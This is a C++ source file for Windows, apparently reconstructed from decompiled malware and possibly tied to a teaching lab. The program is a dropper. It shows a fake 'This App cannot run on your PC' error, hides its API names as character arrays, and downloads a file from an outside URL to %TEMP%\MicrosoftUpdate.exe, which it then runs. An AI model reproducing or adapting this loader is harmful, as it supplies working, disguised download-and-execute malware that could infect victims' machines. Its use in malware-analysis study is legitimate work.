#include <windows.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <wininet.h>

int main(int argc, char* argv[]) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	FreeConsole();
	CHAR temppath[272];
	CHAR filepath[272];
	FARPROC local_20 = (FARPROC)0x0;;
	FARPROC local_18 = (FARPROC)0x0;;
	char path[] = "C:\\malware\\ch0nky.txt";
	DWORD f_attrib = GetFileAttributesA(path);
	if (f_attrib == 0xffffffff || ((f_attrib & 0x10) != 0)){
		while (true) {
			Sleep(1000);
			break;
		}
	}
	MessageBoxA((HWND)0x0, "This App cannot run on your PC",
		"To find a version that can, check with the publisher!", 0);
	// Sleep(60000);
	GetTempPathA(0x104, temppath);
	char lib[] = { 'u', 'r', 'l', 'm', 'o', 'n', '.', 'd', 'l', 'l', '\0'};
	char filename[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', 'U', 'p', 'd', 'a', 't', 'e', '.', 'e', 'x', 'e', '\0'};
	char processname[] = { 'U', 'r', 'l', 'M', 'k', 'S', 'e', 't', 'S', 'e', 's', 's', 'i', 'o', 'n', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
	char processname1[] = { 'U', 'R', 'L', 'D', 'o', 'w', 'n', 'l', 'o', 'r', 'd', 'T', 'o', 'F', 'i', 'l', 'e', 'A', '\0' };

	char lib1[] = { 'W', 'I', 'N', 'I', 'N', 'E', 'T', '.', 'd', 'l', 'l', '\0' };
	char processname2[] = { 'D', 'e', 'l', 'e', 't', 'e', 'U', 'r', 'l', 'C', 'a', 'c', 'h', 'e', 'E', 'n', 't', 'r', 'y', 'A', '\0' };
	HMODULE local_10 = LoadLibraryA(lib);
	local_20 = GetProcAddress(local_10, processname);
	local_18 = GetProcAddress(local_10, processname1);

	https://bostonuniversityfreehomeworksolutions.cf/login.php

	HMODULE local_28 = LoadLibraryA(lib1);
	FARPROC local_30 = (FARPROC)0x0;
	local_30 = GetProcAddress(local_28, &processname2);

	PathCombineA(filepath, temppath, filename);


	memset(&si, 0, 0x68);
	si.cb = 0x68;


	char local_78[] = {'h', 't', 't', 'p', ':', '/', '/', 'b', 'o', 's', 't', 'o', 'n', 'u', 'n', 'i', 'v', 'e', 'r', 's', 'i', 't', 'y', 'f', 'r', 'e', 'e', 'h', 'o', 'm', 'e', 'w', 'o', 'r', 'k', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 's', '.', 'c', 'f', '/', 'l', 'o', 'g', 'i', 'n', '.', 'p', 'h', 'p','\0'};
	(*local_30)(local_78);

	int local_41f = 0x6e306863;
	(*local_20)(0x10000001, (LPVOID)"ch0nky", 7, 0);
	if ((*local_18)(0, &local_78, filepath, 0) > -1) {
		if (CreateProcessA((LPCSTR)0x0, filepath, (LPSECURITY_ATTRIBUTES)0x0,
			(LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPCSTR)0x0, &si,
			&pi) == 0) {
			CloseHandle(pi.hProcess);
		}
	}
	return 0;	
}
